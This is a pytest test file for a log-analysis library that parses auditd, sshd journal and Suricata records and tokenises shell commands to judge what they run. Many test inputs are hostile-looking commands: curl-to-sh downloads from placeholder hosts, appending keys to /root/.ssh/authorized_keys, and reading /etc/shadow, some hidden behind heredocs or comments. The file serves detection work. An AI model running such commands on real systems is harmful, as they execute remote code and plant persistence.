"""Audit parsing, shell parsing and normalizers against lab-shaped records."""
import json

import pytest

from romulus.evidence.auditd import execve_argv, parse_record
from romulus.evidence.normalize import normalize_hits
from romulus.evidence.shellparse import UnknownShellScript, parse_script, shell_script_file_of, shell_script_of
from romulus.evidence.typed import Outcome

# shapes copied from the lab index (benign motd job)
EXECVE_HEX = ('type=EXECVE msg=audit(1731950250.320:76806): argc=3 a0="sh" a1="-c" a2=2F7573722F62696E2F656E76202D'
              '6920504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F62696E3A2F7573722F7362696E3A2F'
              '7573722F62696E3A2F7362696E3A2F62696E2072756E2D7061727473202D2D6C7362737973696E6974202F6574632F7570'
              '646174652D6D6F74642E64203E202F72756E2F6D6F74642E64796E616D69632E6E6577')
SYSCALL = ('type=SYSCALL msg=audit(1731950250.320:76806): arch=c000003e syscall=59 success=yes exit=0 a0=1 a1=2 '
           'a2=3 a3=0 items=2 ppid=80935 pid=80936 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 '
           'fsgid=0 tty=(none) ses=128 comm="sh" exe="/usr/bin/dash" subj==unconfined key=(null)'
           '\x1dARCH=x86_64 SYSCALL=execve AUID="aecid" UID="root" GID="root" EUID="root"')


def hit(_id, dataset, original, ts="2024-11-18T17:17:30.320Z", host="videoserver", **extra):
    src = {"@timestamp": ts, "message": original, "event": {"dataset": dataset, "original": original},
           "host": {"name": host}, **extra}
    return {"_id": _id, "_index": "romulus-host-logs-sl700-e-a", "_source": src}


def test_execve_hex_argument_decodes():
    argv = execve_argv(parse_record(EXECVE_HEX))
    assert argv[:2] == ["sh", "-c"]
    assert argv[2].startswith("/usr/bin/env -i PATH=") and argv[2].endswith("> /run/motd.dynamic.new")


def test_numeric_fields_are_never_hex_decoded():
    # regression: argc=13 / pid=10 look like hex but are numbers (found on live lab data)
    rec = parse_record('type=EXECVE msg=audit(1.0:7): argc=13 a0="x" a1="1" a2="2" a3="3" a4="4" a5="5" '
                       'a6="6" a7="7" a8="8" a9="9" a10="10" a11="11" a12=4142')
    assert rec.fields["argc"] == "13"
    argv = execve_argv(rec)
    assert len(argv) == 13 and argv[12] == "AB"
    sc = parse_record('type=SYSCALL msg=audit(1.0:7): pid=10 ppid=20 comm=6162 exe="/bin/x"')
    assert sc.fields["pid"] == "10" and sc.fields["comm"] == "ab"


def test_execve_split_long_argument_reassembles():
    long = "A" * 10
    rec = parse_record('type=EXECVE msg=audit(1.0:5): argc=2 a0="cat" a1_len=10 a1[0]=' + long[:6].encode().hex()
                       + ' a1[1]=' + long[6:].encode().hex())
    assert execve_argv(rec) == ["cat", long]


def test_exec_group_joins_syscall_and_keeps_unknowns_explicit():
    events, skips, errors = normalize_hits([hit("e1", "linux.audit", EXECVE_HEX), hit("s1", "linux.audit", SYSCALL)])
    assert errors == [] and len(events) == 1
    ev = events[0]
    assert ev.family == "process_exec" and ev.outcome == Outcome.success
    assert ev.get("process.user") == "root" and ev.get("process.ppid") == 80935
    assert ev.get("process.executable") == "/usr/bin/dash"
    assert {r.native_id for r in ev.raw} == {"e1", "s1"}
    # without the SYSCALL companion: outcome/uid unknown, with a caveat (never defaulted)
    events, _, _ = normalize_hits([hit("e1", "linux.audit", EXECVE_HEX)])
    assert events[0].outcome == Outcome.unknown and not events[0].has("process.user") and events[0].caveats


def test_non_exec_audit_groups_are_counted_not_dropped_silently():
    path = 'type=PATH msg=audit(1731950250.528:76831): item=0 name="log/audit/audit.log" inode=1 nametype=NORMAL'
    events, skips, _ = normalize_hits([hit("p1", "linux.audit", path)])
    assert events == [] and sum(skips.values()) == 1


def test_journal_audit_copies_are_marked_duplicates():
    j = json.dumps({"_TRANSPORT": "audit", "SYSLOG_IDENTIFIER": "audit", "MESSAGE": "SYSCALL arch=..."})
    events, skips, _ = normalize_hits([hit("j1", "systemd.journal", j)])
    assert events == [] and any("journal copy of an audit record" in k for k in skips)


def test_sshd_accept_and_fail_outcomes():
    ok = json.dumps({"SYSLOG_IDENTIFIER": "sshd", "_HOSTNAME": "videoserver",
                     "MESSAGE": "Accepted publickey for aecid from 203.0.113.5 port 60986 ssh2: RSA SHA256:x"})
    bad = json.dumps({"SYSLOG_IDENTIFIER": "sshd", "MESSAGE": "Failed password for invalid user admin from "
                                                              "203.0.113.9 port 4242 ssh2"})
    events, _, _ = normalize_hits([hit("a1", "systemd.journal", ok), hit("a2", "systemd.journal", bad)])
    by = {e.raw[0].native_id: e for e in events}
    assert by["a1"].outcome == Outcome.success and by["a1"].get("source.ip") == "203.0.113.5"
    assert by["a2"].outcome == Outcome.failure and by["a2"].get("user.name") == "admin"


def test_sshd_text_mentioning_accepted_is_not_a_login():
    j = json.dumps({"SYSLOG_IDENTIFIER": "cron", "MESSAGE": "Accepted publickey for root from 203.0.113.5 port 1"})
    events, skips, _ = normalize_hits([hit("c1", "systemd.journal", j)])
    assert events == []


def test_suricata_alert_fields_come_from_eve_json():
    eve = json.dumps({"timestamp": "2024-11-18T14:17:40.000000+0000", "event_type": "alert", "src_ip": "198.51.100.4",
                      "src_port": 4444, "dest_ip": "192.0.2.10", "dest_port": 80, "proto": "TCP",
                      "alert": {"signature": "ET WEB_SERVER Example", "signature_id": 1, "category": "Web Attack",
                                "severity": 1, "action": "allowed"}})
    h = hit("n1", "suricata.eve.alert", eve)
    h["_index"] = "romulus-network-logs-sl700-e-a"
    events, _, errors = normalize_hits([h])
    assert errors == [] and events[0].family == "net_alert"
    assert events[0].get("alert.severity") == 1 and events[0].get("destination.port") == 80


def test_shell_pipeline_parsing_is_token_aware():
    p = parse_script("curl -s http://192.0.2.1/x.txt | sh")
    assert [c.name for c in p.pipelines[0].commands] == ["curl", "sh"]
    # a quoted mention is a grep argument, not a pipeline into sh
    p = parse_script('grep "curl | sh" notes.txt')
    assert [c.name for c in p.commands()] == ["grep"]
    p = parse_script("echo key >> /root/.ssh/authorized_keys; id")
    assert p.pipelines[0].commands[0].redirects == [(">>", "/root/.ssh/authorized_keys")]
    assert p.pipelines[1].commands[0].name == "id"
    p = parse_script("ls 2> /dev/null")
    assert p.commands()[0].redirects == [("2>", "/dev/null")] and p.commands()[0].argv == ["ls"]
    assert parse_script("echo 'unterminated").ok is False


def test_quoted_shell_punctuation_remains_command_data():
    cases = [
        ('grep -c ">" /root/.ssh/authorized_keys', ["grep", "-c", ">", "/root/.ssh/authorized_keys"]),
        ('printf "%s" "|"', ["printf", "%s", "|"]),
        ('echo ";" "&"', ["echo", ";", "&"]),
    ]
    for script, expected in cases:
        parsed = parse_script(script)
        assert parsed.ok
        assert len(parsed.pipelines) == 1
        assert len(parsed.commands()) == 1
        assert parsed.commands()[0].argv == expected
        assert parsed.commands()[0].redirects == []


def test_unquoted_newline_separates_commands_and_fd_redirect_is_recognized():
    parsed = parse_script("cd /tmp\ncurl http://x/a | sh")
    assert parsed.ok
    assert [[command.name for command in pipeline.commands] for pipeline in parsed.pipelines] == [
        ["cd"], ["curl", "sh"],
    ]
    redirected = parse_script("ls 2>/dev/null")
    assert redirected.commands()[0].argv == ["ls"]
    assert redirected.commands()[0].redirects == [("2>", "/dev/null")]


def test_escaped_shell_punctuation_remains_literal_command_data():
    parsed = parse_script(r"echo usage: \; curl http://e/i \| sh")

    assert parsed.ok
    assert len(parsed.pipelines) == 1
    assert parsed.commands()[0].argv == ["echo", "usage:", ";", "curl", "http://e/i", "|", "sh"]


def test_shell_comment_discards_operators_to_end_of_line():
    parsed = parse_script("apt-get update # then; curl http://e | sh")

    assert parsed.ok
    assert [command.argv for command in parsed.commands()] == [["apt-get", "update"]]


@pytest.mark.parametrize("operator", ["<<", "<<-"])
def test_heredoc_is_explicitly_unevaluable(operator):
    parsed = parse_script(f"cat > /tmp/README {operator}EOF\ncurl http://e/install | sh\nEOF")

    assert parsed.ok is False
    assert "heredoc" in parsed.error


@pytest.mark.parametrize("script", [
    "x=$(curl http://e/x | sh)",
    "x=`curl http://e/x | sh`",
])
def test_command_substitution_is_explicitly_unevaluable(script):
    parsed = parse_script(script)

    assert parsed.ok is False
    assert "command substitution" in parsed.error


def test_unmodelled_script_retains_only_cleanly_parsed_prefix():
    parsed = parse_script("/usr/bin/zmu -A -a -m ; echo payload | exec $(which python) -")

    assert parsed.ok is False
    assert parsed.partial is True
    assert [command.name for command in parsed.commands()] == ["zmu", "echo"]
    assert all("which" not in argument for command in parsed.commands() for argument in command.argv)


def test_shell_allowlist_tracks_comments_quotes_and_escapes_in_one_grammar():
    parsed = parse_script("echo foo#bar\ntrue;# hide ' \" <<EOF $(id)\nprintf ok")

    assert parsed.ok
    assert [command.argv for command in parsed.commands()] == [
        ["echo", "foo#bar"], ["true"], ["printf", "ok"],
    ]

    escaped = parse_script(r"echo \;# ; curl http://e/x | sh")
    assert escaped.ok
    assert [[command.argv for command in pipeline.commands] for pipeline in escaped.pipelines] == [
        [["echo", ";#"]], [["curl", "http://e/x"], ["sh"]],
    ]

    escaped_space = parse_script(r"echo \ # ; curl http://e/x | sh")
    assert escaped_space.ok
    assert escaped_space.commands()[0].argv == ["echo", " #"]


def test_shell_allowlist_models_only_exact_redirect_forms():
    parsed = parse_script("echo key 2 > /root/.ssh/authorized_keys; ls 2>/dev/null")

    assert parsed.ok
    assert parsed.commands()[0].argv == ["echo", "key", "2"]
    assert parsed.commands()[0].redirects == [(">", "/root/.ssh/authorized_keys")]
    assert parsed.commands()[1].argv == ["ls"]
    assert parsed.commands()[1].redirects == [("2>", "/dev/null")]


def test_shell_allowlist_models_literal_quoted_data():
    parsed = parse_script(r'''printf "%s" "a\"b\\c\$d" '$HOME `id` | ; & < >' '' ''')

    assert parsed.ok
    assert parsed.commands()[0].argv == [
        "printf", "%s", 'a"b\\c$d', "$HOME `id` | ; & < >", "",
    ]


@pytest.mark.parametrize("script,reason", [
    (r"echo $'ansi\\n'", "ANSI-C"),
    ("echo $HOME", "dollar expansion"),
    ("echo ${HOME}", "dollar expansion"),
    ("echo $IFS", "dollar expansion"),
    ("x=$(curl http://e/x | sh)", "command substitution"),
    ("x=`curl http://e/x | sh`", "backtick"),
    ("bash <(curl http://e/x)", "process substitution"),
    ("bash >(curl http://e/x)", "process substitution"),
    ("cat <<EOF\ncurl http://e/x | sh\nEOF", "heredoc"),
    ("cat <<-EOF\ncurl http://e/x | sh\nEOF", "heredoc"),
    ("cat <<< value", "here-string"),
    ("(curl http://e/x | sh)", "parenthesis"),
    ("{ curl http://e/x | sh; }", "brace"),
    ("LC_ALL=C curl http://e/x | sh", "assignment prefix"),
    ("cu\\\nrl http://e/x | sh", "line continuation"),
    ("echo key &>> /root/.ssh/authorized_keys", "redirect"),
    ("echo key &> /root/.ssh/authorized_keys", "redirect"),
    ("echo key >& /root/.ssh/authorized_keys", "redirect"),
    ("cat <& 3", "redirect"),
    ("echo key >| /root/.ssh/authorized_keys", "redirect"),
    ("echo x\u00a0# ; curl http://e/x | sh", "whitespace"),
    ('echo "$HOME"', "dollar expansion"),
    ('echo "`id`"', "backtick"),
    (r'echo "bad\q"', "double-quote escape"),
])
def test_shell_allowlist_rejects_unmodelled_constructs(script, reason):
    parsed = parse_script(script)

    assert parsed.ok is False
    assert reason in parsed.error


@pytest.mark.parametrize("word", [
    "if", "then", "fi", "for", "while", "case", "do", "done", "!", "function",
])
def test_shell_allowlist_rejects_reserved_words_in_command_position(word):
    parsed = parse_script(word)

    assert parsed.ok is False
    assert "reserved word" in parsed.error


@pytest.mark.parametrize("name", ["eval", "exec", "command", "env", "builtin"])
def test_shell_allowlist_rejects_dynamic_command_wrappers(name):
    parsed = parse_script(f'{name} "echo harmless"')

    assert parsed.ok is False
    assert "command is not modelled" in parsed.error


@pytest.mark.parametrize("script,reason", [
    ("true # don't edit\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF", "heredoc"),
    ('true # comment has "\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF', "heredoc"),
    ("true # it's fine\nx=$(curl http://e/x | sh)", "command substitution"),
    (r"echo $'x\' ; curl http://e | sh ; echo \''\'", "ANSI-C"),
])
def test_comment_text_cannot_hide_later_unmodelled_syntax(script, reason):
    parsed = parse_script(script)

    assert parsed.ok is False
    assert reason in parsed.error


def test_shell_script_extraction():
    assert shell_script_of(["/bin/sh", "-c", "id"]) == "id"
    assert shell_script_of(["bash", "-lc", "id"]) == "id"
    assert shell_script_of(["bash", "script.sh"]) is None
    assert shell_script_of(["python3", "-c", "print(1)"]) is None


@pytest.mark.parametrize("login_shell", ["-bash", "-sh"])
def test_login_shell_name_is_recognized_for_script_extraction(login_shell):
    assert shell_script_of([login_shell, "-c", "curl http://e/x | sh"]) == "curl http://e/x | sh"


@pytest.mark.parametrize("argv", [
    ["bash", "/tmp/x.sh", "-c"],
    ["bash", "/tmp/x.sh", "-recursive"],
])
def test_shell_option_scan_stops_at_script_file(argv):
    assert shell_script_of(argv) is None


@pytest.mark.parametrize("argv,expected", [
    (["bash", "-o", "pipefail", "/tmp/x.sh"], "/tmp/x.sh"),
    (["bash", "+x", "/tmp/x.sh"], "/tmp/x.sh"),
    (["bash", "-O", "extglob", "/tmp/x.sh"], "/tmp/x.sh"),
    (["bash", "--rcfile", "/tmp/bashrc", "/tmp/x.sh"], "/tmp/x.sh"),
    (["busybox", "sh", "/tmp/x.sh"], "/tmp/x.sh"),
    (["bash", "/tmp/x.sh", "-c"], "/tmp/x.sh"),
    (["bash", "-c", "/tmp/x.sh"], None),
])
def test_shell_script_file_uses_shell_option_scanner(argv, expected):
    assert shell_script_file_of(argv) == expected


@pytest.mark.parametrize("argv", [
    ["bash", "-c", "--", "id"],
    ["bash", "-c", "-x", "id"],
    ["bash", "-o", "pipefail", "-c", "id"],
    ["busybox", "sh", "-c", "id"],
    ["bash", "-c"],
    ["bash", "-c", "+e", "id"],
    ["sh", "-c", "+e", "id"],
    ["bash", "-lc", "+e", "id"],
])
def test_ambiguous_shell_command_returns_explicit_unknown(argv):
    result = shell_script_of(argv)

    assert isinstance(result, UnknownShellScript)
    assert result.reason


@pytest.mark.parametrize("shell", ["zsh", "ksh", "fish", "csh", "tcsh"])
def test_non_posix_shell_script_is_explicitly_unknown(shell):
    result = shell_script_of([shell, "-c", "curl http://e/x | sh"])

    assert isinstance(result, UnknownShellScript)
    assert "shell grammar" in result.reason


# ---------------------------------------------------------------- M1 gate regressions (B1, I4)
def test_unparseable_audit_record_is_an_error_not_a_silent_drop():
    truncated = 'type=EXECVE msg=audit(1731950250.320:900): argc=3 a0="sh" a1="-c" a2="curl http://x | s'
    events, skips, errors = normalize_hits([hit("t1", "linux.audit", truncated)])
    assert events == [] and errors and "unparseable" in errors[0][1]


def test_audit_record_missing_raw_text_is_an_error():
    h = hit("m1", "linux.audit", "x")
    h["_source"]["event"].pop("original")
    h["_source"].pop("message")
    events, skips, errors = normalize_hits([h])
    assert events == [] and errors and "missing authoritative" in errors[0][1]


def test_node_prefixed_audit_records_parse():
    rec = parse_record("node=web01 " + EXECVE_HEX)
    assert rec.type == "EXECVE" and rec.serial == 76806


def test_same_serial_different_timestamp_are_separate_events():
    a = 'type=EXECVE msg=audit(1731950000.000:500): argc=2 a0="cat" a1="/etc/shadow"'
    b = 'type=EXECVE msg=audit(1731959999.000:500): argc=1 a0="ls"'
    events, _, errors = normalize_hits([hit("x1", "linux.audit", a), hit("x2", "linux.audit", b)])
    assert errors == [] and sorted(e.get("process.argv")[0] for e in events) == ["cat", "ls"]


def test_ambiguous_duplicate_group_is_an_error():
    a = 'type=EXECVE msg=audit(1731950000.000:501): argc=1 a0="cat"'
    events, _, errors = normalize_hits([hit("d1", "linux.audit", a), hit("d2", "linux.audit", a)])
    assert events == [] and errors and "ambiguous" in errors[0][1]


def test_journal_without_original_is_an_error():
    h = hit("j9", "systemd.journal", "Accepted publickey for root from 203.0.113.5 port 1 ssh2")
    h["_source"]["event"].pop("original")
    events, skips, errors = normalize_hits([h])
    assert events == [] and errors and "missing authoritative" in errors[0][1]


def test_long_argv_split_across_execve_records_is_merged():
    # real auditd behaviour (seen in the lab): argc on the first record, later aN on continuations
    head = 'type=EXECVE msg=audit(1731940398.711:39823): argc=4 a0="find" a1="/bin" a2="-name"'
    cont = 'type=EXECVE msg=audit(1731940398.711:39823):  a3="x.conf"'
    events, _, errors = normalize_hits([hit("h1", "linux.audit", head), hit("h2", "linux.audit", cont)])
    assert errors == [] and events[0].get("process.argv") == ["find", "/bin", "-name", "x.conf"]
    assert {r.native_id for r in events[0].raw} == {"h1", "h2"}


def test_conflicting_execve_continuation_is_an_error():
    head = 'type=EXECVE msg=audit(1731940398.711:39824): argc=2 a0="cat" a1="a"'
    cont = 'type=EXECVE msg=audit(1731940398.711:39824):  a1="b"'
    events, _, errors = normalize_hits([hit("c1", "linux.audit", head), hit("c2", "linux.audit", cont)])
    assert events == [] and errors and "conflicting" in errors[0][1]
